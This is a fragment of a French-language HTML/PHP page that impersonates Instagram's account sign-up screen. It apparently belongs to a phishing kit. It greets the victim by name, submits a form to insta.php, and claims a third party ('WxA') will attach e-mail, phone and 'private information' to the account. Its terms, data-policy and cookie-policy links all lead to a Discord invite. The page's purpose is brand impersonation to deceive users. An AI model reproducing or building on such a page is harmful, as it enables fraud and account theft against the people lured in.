            ...
            <form action="insta.php">
                <div class="formulaire">
                    <div name="text2" id="text2">
                        <h3>Bienvenue sur Instagram <?php echo $name; ?></h3>
                        <p style="color: rgba( 255, 255, 255, 0.5)">Nous ajouterons l'adresse e-mail et le numéro de téléphone de WxA à <?php echo $name; ?>. Vous pouvez modifier ces informations à tout moment dans les paramètres, ou saisir de nouvelles information </p>
                    </div>
                    <button id="Suivant" type="submit">Terminer l'inscription</button>
                </div>
                <footer>
                    <p>Nous ajouterons les informations privées de WxA sur <?php echo $name; ?>. Voir les <a href="https://discord.gg/qCtMEdAvjQ"><strong>Conditions d'utilisation,</strong></a> la <a href="https://discord.gg/qCtMEdAvjQ"><strong>Politique d'utilisation des données</strong></a> et la <a href="https://discord.gg/qCtMEdAvjQ"><strong>Politique d'utilisation des cookies.</strong></a></p>
                </footer>
            </form>
            <div class="line"></div>
        </div>
